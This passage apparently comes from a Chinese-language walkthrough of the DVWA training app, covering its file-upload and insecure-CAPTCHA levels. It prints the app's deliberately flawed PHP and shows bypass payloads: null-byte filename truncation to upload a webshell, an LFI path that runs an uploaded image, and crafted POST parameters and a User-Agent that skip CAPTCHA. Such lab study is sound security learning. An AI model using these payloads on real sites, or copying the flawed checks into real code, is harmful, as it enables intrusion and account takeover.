class="number">100000</span> ) &amp;&amp;</span><br><span class="line">        getimagesize( $uploaded_tmp ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">        <span class="keyword">if</span>( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123;</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Invalid file</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>增加了文件后缀的白名单，又要后缀满足条件又要能执行，如果是<code>php&lt;5.3.4</code>的情况，可以利用<code>%00</code>截断文件名。而在其他版本，或许可以考虑上传<code>jpg</code>，利用其他漏洞读上传的文件。</p><p><strong>利用%00截断（php版本&lt;5.3.4）</strong></p><p>上传写有一句话的的马，命令为<code>v0w.php .jpg</code>,然后修改空格为<code>0x00</code>,从而截断，服务器会认为该文件为<code>v0w.php</code>,同时又可以通过后缀名的检测。</p><blockquote><p>注意：这里所说的%00，是指<code>0x00</code>，在burpsuite中修改时，需要在hex中修改</p></blockquote><p><img src="https://i.loli.net/2020/03/03/Nfe1SQ8Fpnvjy7x.png"></p><p><strong>结合包含漏洞进行攻击（php&gt;5.3.4）</strong></p><p>我们只能上传<code>v0w.jpg</code>(写有一句话木马)，但是作为jpg文件，没法执行。同时我们知道上传文件的路径</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">..&#x2F;..&#x2F;hackable&#x2F;uploads&#x2F;v0w.jpg succesfully uploaded!</span><br></pre></td></tr></table></figure><p>在<strong>File Inclusion</strong>中，我们爆出了WWW的路径，拼接一下得到完整的<code>v0w.jpg</code>的路径。然后我们可以利用<code>file://</code>来读这个图片。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.220.1&#x2F;dvwa&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;file:&#x2F;&#x2F;&#x2F;D:&#x2F;Environment&#x2F;PhpStudy2018&#x2F;PHPTutorial&#x2F;WWW&#x2F;dvwa&#x2F;hackable&#x2F;uploads&#x2F;v0w.jpg</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/03/XgnaKYqNDG5A2sJ.png"></p><h2 id="Impossible-3"><a href="#Impossible-3" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Check Anti-CSRF token </span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> ); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information </span></span><br><span class="line">    $uploaded_name = $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ]; </span><br><span class="line">    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, <span class="string">&#x27;.&#x27;</span> ) + <span class="number">1</span>); </span><br><span class="line">    $uploaded_size = $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ]; </span><br><span class="line">    $uploaded_type = $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;type&#x27;</span> ]; </span><br><span class="line">    $uploaded_tmp  = $_FILES[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Where are we going to be writing to? </span></span><br><span class="line">    $target_path   = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&#x27;hackable/uploads/&#x27;</span>; </span><br><span class="line">    <span class="comment">//$target_file   = basename( $uploaded_name, &#x27;.&#x27; . $uploaded_ext ) . &#x27;-&#x27;; </span></span><br><span class="line">    $target_file   =  md5( uniqid() . $uploaded_name ) . <span class="string">&#x27;.&#x27;</span> . $uploaded_ext; </span><br><span class="line">    $temp_file     = ( ( ini_get( <span class="string">&#x27;upload_tmp_dir&#x27;</span> ) == <span class="string">&#x27;&#x27;</span> ) ? ( sys_get_temp_dir() ) : ( ini_get( <span class="string">&#x27;upload_tmp_dir&#x27;</span> ) ) ); </span><br><span class="line">    $temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . <span class="string">&#x27;.&#x27;</span> . $uploaded_ext; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image? </span></span><br><span class="line">    <span class="keyword">if</span>( ( strtolower( $uploaded_ext ) == <span class="string">&#x27;jpg&#x27;</span> || strtolower( $uploaded_ext ) == <span class="string">&#x27;jpeg&#x27;</span> || strtolower( $uploaded_ext ) == <span class="string">&#x27;png&#x27;</span> ) &amp;&amp; </span><br><span class="line">        ( $uploaded_size &lt; <span class="number">100000</span> ) &amp;&amp; </span><br><span class="line">        ( $uploaded_type == <span class="string">&#x27;image/jpeg&#x27;</span> || $uploaded_type == <span class="string">&#x27;image/png&#x27;</span> ) &amp;&amp; </span><br><span class="line">        getimagesize( $uploaded_tmp ) ) &#123; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD) </span></span><br><span class="line">        <span class="keyword">if</span>( $uploaded_type == <span class="string">&#x27;image/jpeg&#x27;</span> ) &#123; </span><br><span class="line">            $img = imagecreatefromjpeg( $uploaded_tmp ); </span><br><span class="line">            imagejpeg( $img, $temp_file, <span class="number">100</span>); </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            $img = imagecreatefrompng( $uploaded_tmp ); </span><br><span class="line">            imagepng( $img, $temp_file, <span class="number">9</span>); </span><br><span class="line">        &#125; </span><br><span class="line">        imagedestroy( $img ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the web root from the temp folder? </span></span><br><span class="line">        <span class="keyword">if</span>( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) &#123; </span><br><span class="line">            <span class="comment">// Yes! </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;a href=&#x27;$&#123;target_path&#125;$&#123;target_file&#125;&#x27;&gt;$&#123;target_file&#125;&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&quot;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="comment">// No </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Delete any temp files </span></span><br><span class="line">        <span class="keyword">if</span>( file_exists( $temp_file ) ) </span><br><span class="line">            unlink( $temp_file ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Invalid file </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token </span></span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>可以看到，Impossible级别的代码对上传文件进行了重命名（为md5值，导致%00截断无法绕过过滤规则），加入Anti-CSRF token防护CSRF攻击，同时对文件的内容作了严格的检查，导致攻击者无法上传含有恶意脚本的文件。</p><h1 id="Insecure-CAPTCHA（不安全的验证）"><a href="#Insecure-CAPTCHA（不安全的验证）" class="headerlink" title="Insecure CAPTCHA（不安全的验证）"></a>Insecure CAPTCHA（不安全的验证）</h1><h2 id="Low-5"><a href="#Low-5" class="headerlink" title="Low"></a>Low</h2><p>不安全的验证码，<code>CAPTCHA</code>是<code>Completely Automated Public Turing Test to Tell Computers and Humans Apart</code> (全自动区分计算机和人类的图灵测试)的简称。</p><p>做这个实验可能需要先弄验证码，按照dvwa的提示，填一个网域和标签就行（网域就是你的IP或者域名）</p><p><img src="https://i.loli.net/2020/03/02/RmU3NAlMZbkrOj6.png"></p><p>但是这个不是重点，这里我们需要测试的是，如何绕过验证。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Change&#x27;</span> ] ) &amp;&amp; ( $_POST[ <span class="string">&#x27;step&#x27;</span> ] == <span class="string">&#x27;1&#x27;</span> ) ) &#123;</span><br><span class="line">    <span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">    $hide_form = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $pass_new  = $_POST[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    $pass_conf = $_POST[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check CAPTCHA from 3rd party</span></span><br><span class="line">    $resp = recaptcha_check_answer(</span><br><span class="line">        $_DVWA[ <span class="string">&#x27;recaptcha_private_key&#x27;</span>],</span><br><span class="line">        $_POST[<span class="string">&#x27;g-recaptcha-response&#x27;</span>]</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Did the CAPTCHA fail?</span></span><br><span class="line">    <span class="keyword">if</span>( !$resp ) &#123;</span><br><span class="line">        <span class="comment">// What happens when the CAPTCHA was entered incorrectly</span></span><br><span class="line">        $html     .= <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        $hide_form = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// CAPTCHA was correct. Do both new passwords match?</span></span><br><span class="line">        <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">            <span class="comment">// Show next stage for the user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">                &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt;</span></span><br><span class="line"><span class="string">                &lt;form action=\&quot;#\&quot; method=\&quot;POST\&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;step\&quot; value=\&quot;2\&quot; /&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_new\&quot; value=\&quot;&#123;$pass_new&#125;\&quot; /&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_conf\&quot; value=\&quot;&#123;$pass_conf&#125;\&quot; /&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\&quot;submit\&quot; name=\&quot;Change\&quot; value=\&quot;Change\&quot; /&gt;</span></span><br><span class="line"><span class="string">                &lt;/form&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Both new passwords do not match.</span></span><br><span class="line">            $html     .= <span class="string">&quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">            $hide_form = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Change&#x27;</span> ] ) &amp;&amp; ( $_POST[ <span class="string">&#x27;step&#x27;</span> ] == <span class="string">&#x27;2&#x27;</span> ) ) &#123;</span><br><span class="line">    <span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">    $hide_form = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $pass_new  = $_POST[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    $pass_conf = $_POST[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to see if both password match</span></span><br><span class="line">    <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        $pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass_new ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update database</span></span><br><span class="line">        $insert = <span class="string">&quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">        $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with the passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        $hide_form = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>借用大佬的一张图，来说明一下<code>reCAPTCHA</code>的验证流程：</p><p><img src="https://i.loli.net/2020/03/02/3qDuw521ZRJKhvo.png"></p><ol><li>用户通过js请求从Google获取序言进行验证的验证码</li><li>用户输入验证码</li><li>服务器通过调用<code>recaptcha_check_answer</code>函数检查用户输入的正确性</li></ol><p>服务器改密码分为两步，第一步检查<code>reCAPTCHA</code>，验证通过后，服务器返回表单，第二部客户端提交POST请求，服务器完后才能改密码操作。但是这其中存在明显的逻辑漏洞，服务器仅仅通过检查Change和step参数来判断用户是否已经输入正确的验证码。</p><p><strong>漏洞利用</strong></p><p>通过构造参数绕过验证过程的第一步</p><p>通过输入密码，点击Change按钮，抓包, 因为没有翻墙，所以没能成功显示验证码，发送的请求包中也就没有<code>recaptcha_challenge_field，recaptcha_response_field</code>两个参数</p><p>直接将step更改为2，就跳过了验证码的验证过程。密码修改成功。</p><p><img src="https://i.loli.net/2020/03/02/p8slTyoQnOVbHqP.png"></p><h2 id="Medium-5"><a href="#Medium-5" class="headerlink" title="Medium"></a>Medium</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Check to see if they did stage 1 </span></span><br><span class="line">    <span class="keyword">if</span>( !$_POST[ <span class="string">&#x27;passed_captcha&#x27;</span> ] ) &#123; </span><br><span class="line">        $html     .= <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;You have not passed the CAPTCHA.&lt;/pre&gt;&quot;</span>; </span><br><span class="line">        $hide_form = <span class="literal">false</span>; </span><br><span class="line">        <span class="keyword">return</span>; </span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure><p>增加了对参数<code>passed_captcha</code>的验证，<strong>payload</strong>增加即可</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">step&#x3D;2&amp;password_new&#x3D;hack&amp;passed_captcha&#x3D;1&amp;password_conf&#x3D;hack&amp;g-recaptcha-response&#x3D;&amp;Change&#x3D;Change</span><br></pre></td></tr></table></figure><h2 id="High-4"><a href="#High-4" class="headerlink" title="High"></a>High</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">$hide_form = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line">$pass_new  = $_POST[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">$pass_conf = $_POST[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check CAPTCHA from 3rd party</span></span><br><span class="line">$resp = recaptcha_check_answer(</span><br><span class="line">$_DVWA[ <span class="string">&#x27;recaptcha_private_key&#x27;</span> ],</span><br><span class="line">$_POST[<span class="string">&#x27;g-recaptcha-response&#x27;</span>]</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (</span><br><span class="line">$resp || </span><br><span class="line">(</span><br><span class="line">$_POST[ <span class="string">&#x27;g-recaptcha-response&#x27;</span> ] == <span class="string">&#x27;hidd3n_valu3&#x27;</span></span><br><span class="line">&amp;&amp; $_SERVER[ <span class="string">&#x27;HTTP_USER_AGENT&#x27;</span> ] == <span class="string">&#x27;reCAPTCHA&#x27;</span></span><br><span class="line">)</span><br><span class="line">)&#123;</span><br><span class="line"><span class="comment">// CAPTCHA was correct. Do both new passwords match?</span></span><br><span class="line"><span class="keyword">if</span> ($pass_new == $pass_conf) &#123;</span><br><span class="line">$pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass_new ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">$pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Update database</span></span><br><span class="line">$insert = <span class="string">&quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27; LIMIT 1;&quot;</span>;</span><br><span class="line">$result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Feedback for user</span></span><br><span class="line">$html .= <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Ops. Password mismatch</span></span><br><span class="line">$html     .= <span class="string">&quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">$hide_form = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// What happens when the CAPTCHA was entered incorrectly</span></span><br><span class="line">$html     .= <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">$hide_form = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (</span><br><span class="line">$resp || </span><br><span class="line">(</span><br><span class="line">$_POST[ <span class="string">&#x27;g-recaptcha-response&#x27;</span> ] == <span class="string">&#x27;hidd3n_valu3&#x27;</span></span><br><span class="line">&amp;&amp; $_SERVER[ <span class="string">&#x27;HTTP_USER_AGENT&#x27;</span> ] == <span class="string">&#x27;reCAPTCHA&#x27;</span></span><br><span class="line">)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>可以看到，服务器的验证逻辑是当<code>$resp</code>（谷歌服务器返回的验证）是TRUE，或者参数<code>recaptcha_response_filed == hidd3n_valu3</code>且http包头的<code>User-Agent</code>参数等于<code>reCAPTCHA</code>）时，就认为验证码输入错误，反之则认为已经通过了验证码的检查。</p><p><strong>漏洞利用</strong></p><p>绕过验证应该把目标放到后面的条件了。</p><p>更改参数<code>recaptcha_response_field</code>以及http包头的<code>User-Agent</code></p><p><img src="https://i.loli.net/2020/03/03/ojZv9epO1ArfnaU.png"></p><h2 id="Impossible-4"><a href="#Impossible-4" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">    $hide_form = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $pass_new  = $_POST[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    $pass_new  = stripslashes( $pass_new );</span><br><span class="line">    $pass_new  = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass_new ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    $pass_new  = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">    $pass_conf = $_POST[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line">    $pass_conf = stripslashes( $pass_conf );</span><br><span class="line">    $pass_conf = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass_conf ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    $pass_conf = md5( $pass_conf );</span><br><span class="line"></span><br><span class="line">    $pass_curr = $_POST[ <span class="string">&#x27;password_current&#x27;</span> ];</span><br><span class="line">    $pass_curr = stripslashes( $pass_curr );</span><br><span class="line">    $pass_curr = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass_curr ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    $pass_curr = md5( $pass_curr );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check CAPTCHA from 3rd party</span></span><br><span class="line">    $resp = recaptcha_check_answer(</span><br><span class="line">        $_DVWA[ <span class="string">&#x27;recaptcha_private_key&#x27;</span> ],</span><br><span class="line">        $_POST[<span class="string">&#x27;g-recaptcha-response&#x27;</span>]</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Did the CAPTCHA fail?</span></span><br><span class="line">    <span class="keyword">if</span>( !$resp ) &#123;</span><br><span class="line">        <span class="comment">// What happens when the CAPTCHA was entered incorrectly</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        $hide_form = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Check that the current password is correct</span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">&#x27;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27;</span> );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">&#x27;:password&#x27;</span>, $pass_curr, PDO::PARAM_STR );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Do both new password match and was the current password correct?</span></span><br><span class="line">        <span class="keyword">if</span>( ( $pass_new == $pass_conf) &amp;&amp; ( $data-&gt;rowCount() == <span class="number">1</span> ) ) &#123;</span><br><span class="line">            <span class="comment">// Update the database</span></span><br><span class="line">            $data = $db-&gt;prepare( <span class="string">&#x27;UPDATE users SET password = (:password) WHERE user = (:user);&#x27;</span> );</span><br><span class="line">            $data-&gt;bindParam( <span class="string">&#x27;:password&#x27;</span>, $pass_new, PDO::PARAM_STR );</span><br><span class="line">            $data-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line">            $data-&gt;execute();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for the end user - success!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Feedback for the end user - failed!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Either your current password is incorrect or the new passwords did not match.&lt;br /&gt;Please try again.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">            $hide_form = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span 